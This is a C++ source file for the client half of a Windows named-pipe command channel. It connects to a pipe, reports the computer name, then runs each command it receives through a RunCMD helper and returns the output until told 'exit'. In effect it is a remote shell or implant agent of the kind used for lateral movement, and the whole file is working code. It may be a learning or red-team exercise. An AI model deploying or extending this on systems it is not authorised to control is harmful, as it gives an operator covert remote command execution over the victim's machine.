#include "run cmd.hpp"


bool Client(CHAR* NamedPipeName) {
	HANDLE hNamedPipe = ::CreateFileA(NamedPipeName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, 0, NULL);

	if (hNamedPipe == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open pipe.");
		return 1;
	}

	CHAR result[DATA_BUFFER_SIZE];
	DWORD send = DATA_BUFFER_SIZE;
	CHAR cmd[DATA_BUFFER_SIZE];
	DWORD recv = DATA_BUFFER_SIZE;

	::GetComputerNameA(result, &send);
	printf("Computer Name : %s\n\n", result);
	if (!::WriteFile(hNamedPipe, result, sizeof(result), &send, NULL)) {
		printf("[-] Failed to send result.\n");
		return 1;
	}

	while (true) {
		::ZeroMemory(cmd, DATA_BUFFER_SIZE);
		if (!::ReadFile(hNamedPipe, cmd, DATA_BUFFER_SIZE, &recv, NULL) || recv == 0) {
			printf("[-] Connection ended.\n");
			break;
		}

		if (strcmp("exit", cmd) == 0) break;

		::ZeroMemory(result, DATA_BUFFER_SIZE);
		if (RunCMD(cmd, result) == 1) {
			::strcpy_s(result, "Error\n");
		}

		if (!::WriteFile(hNamedPipe, result, DATA_BUFFER_SIZE, &send, NULL)) {
			printf("[-] Failed to send result.\n\n");
		}
		//else {
		//	printf("%s\n", result);
		//}
	}
	
	::CloseHandle(hNamedPipe);
	return 0;
}